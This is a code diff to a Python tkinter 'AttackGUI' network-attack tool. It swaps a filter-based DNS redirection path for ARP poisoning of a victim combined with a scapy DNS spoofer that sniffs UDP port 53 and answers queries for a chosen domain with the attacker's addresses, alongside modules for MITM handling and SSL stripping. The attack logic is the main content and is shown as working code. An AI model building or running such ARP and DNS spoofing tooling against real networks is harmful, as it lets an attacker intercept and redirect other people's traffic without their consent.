@@ -10,6 +10,7 @@ from DomainRedirectFilter import DomainRedirectFilter
 from mitm_handler import MitmHandler
 from SSLFilter import SSLStripFilter
 import subprocess
+from scapy.layers.inet6 import IPv6
 
 
 class AttackGUI:
@@ -260,42 +261,7 @@ class AttackGUI:
                 victim_ip = self.dns_victim_entry.get().strip()
                 server_ip = self.get_gateway_ipv4()
                 spoof_mac = self.get_attacker_mac()
-                attacker_ip = self.attacker_ipv4
                 domain = self.dns_domain_entry.get().strip().lower()
-                spoof_ip = self.dns_spoof_ip_entry.get().strip()
-                spoof_ipv6 = self.dns_spoof_ipv6_entry.get().strip() or None 
-
-                if not victim_ip or not domain or not spoof_ip:
-                    self.log("DNS attack error: missing required fields")
-                    return
-
-                self.log("Starting DNS-based redirection:")
-                self.log(f"  Victim: {victim_ip}")
-                self.log(f"  Domain: {domain}")
-                self.log(f"  Redirect IPv4 → {spoof_ip}")
-
-                tracker = DNSDomainTracker(domain, self.log)
-                redirect = DomainRedirectFilter(
-                    tracker,
-                    victim_ip=victim_ip,
-                    attacker_ip=attacker_ip,
-                    spoof_ip=spoof_ip,
-                    logger=self.log
-                )
-
-                mitm_handler = MitmHandler(
-                    sc.conf.iface,
-                    server_ip,
-                    victim_ip,
-                    spoof_mac,
-                    spoof_ip,
-                    spoof_ipv6,
-                    self.log
-                )
-
-                mitm_handler.add_filter(tracker)    # DNS learning
-                mitm_handler.add_filter(redirect)   # traffic redirect
-                mitm_handler.start()
 
                 arp_poisoner = ARPPoisoner(
                     sc.conf.iface,
@@ -305,6 +271,15 @@ class AttackGUI:
                     self.log
                 )
                 arp_poisoner.start()
+
+                dns_spoofer = Dns_spoofing.DNSSpoofer(sc.conf.iface, victim_ip, domain, self.attacker_ipv4, self.attacker_ipv6, self.log)
+
+                sc.sniff(
+                    iface=sc.conf.iface,
+                    filter="udp port 53",
+                    prn=dns_spoofer.dns_spoofer,
+                    store=0
+                )
 
             # MITM
             else:
@@ -323,7 +298,6 @@ class AttackGUI:
                 mitm_handler.start()
 
         threading.Thread(target=worker, daemon=True).start()
-
 
 if __name__ == "__main__":
     root = tk.Tk()
